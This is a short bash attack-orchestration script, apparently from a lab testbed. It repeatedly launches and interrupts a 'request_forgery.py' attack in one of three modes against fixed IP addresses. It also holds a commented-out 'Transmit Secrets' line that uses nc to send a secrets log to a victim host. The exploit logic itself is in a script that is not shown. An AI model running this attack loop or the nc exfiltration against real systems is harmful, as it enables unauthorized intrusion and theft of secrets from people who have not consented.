#!/bin/bash


#Execute Attack

#CMRF
#CMD="python3 request_forgery.py cm -t 1337 192.168.217.131 123.123.123.123 &"
 
#SIRF
CMD="python3 request_forgery.py si -t 1337 192.168.217.131 123.123.123.123"

#VNRF
#CMD="python3 request_forgery.py vn -t 1337 192.168.217.131 123.123.123.123 &"


for i in {1..10} 
do
	$CMD &
	PID=$!
	sleep 2
	kill -INT $PID
	sleep 3
done


#Terminate Attack Script

#sleep 3
#pkill -P $$
#PID=$!
#sleep 10
#kill $PID

#Transmit Secrets

#nc $VICTIM_IP 2345 < secrets/secrets.log
